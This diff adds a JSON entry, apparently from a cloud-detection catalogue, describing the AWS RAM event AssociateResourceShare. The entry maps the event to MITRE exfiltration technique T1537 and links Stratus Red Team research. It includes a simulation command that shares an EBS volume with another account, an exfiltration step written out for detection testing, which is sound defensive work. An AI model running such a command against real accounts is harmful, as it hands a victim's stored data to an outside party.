@@ -1,0 +1,35 @@
+{
+    "eventName": "AssociateResourceShare",
+    "eventSource": "ram.amazonaws.com",
+    "awsService": "RAM",
+    "description": "Adds the specified list of principals and list of resources to a resource share. Principals that already have access to this resource share immediately receive access to the added resources. Newly added principals immediately receive access to the resources shared in this resource share.",
+    "mitreAttackTactics": [
+        "TA0010 - Exfiltration"
+    ],
+    "mitreAttackTechniques": [
+        "T1537 - Transfer Data to Cloud Account"
+    ],
+    "mitreAttackSubTechniques": [],
+    "unverifiedMitreAttackTechniques": [],
+    "usedInWild": false,
+    "incidents": [],
+    "researchLinks": [
+        {
+            "description": "Share an EBS Volume for Cross-Account Cloning",
+            "link": "https://stratus-red-team.cloud/attack-techniques/AWS/aws.exfiltration.ec2-share-ebs-volume/"
+        }
+    ],
+    "securityImplications": "Attackers might use AssociateResourceShare to share resources such as EBS volumes with an AWS account they control through AWS RAM, letting them clone and read the data outside the victim account.",
+    "alerting": [],
+    "simulation": [
+        {
+            "type": "commandLine",
+            "value": "aws ram associate-resource-share --resource-share-arn arn:aws:ram:us-east-1:111111111111:resource-share/TrailDiscover --principals 123456789012 --resource-arns arn:aws:ec2:us-east-1:111111111111:volume/vol-0123456789abcdef0"
+        },
+        {
+            "type": "stratusRedTeam",
+            "value": "https://stratus-red-team.cloud/attack-techniques/AWS/aws.exfiltration.ec2-share-ebs-volume"
+        }
+    ],
+    "permissions": "https://aws.permissions.cloud/iam/ram#ram-AssociateResourceShare"
+}
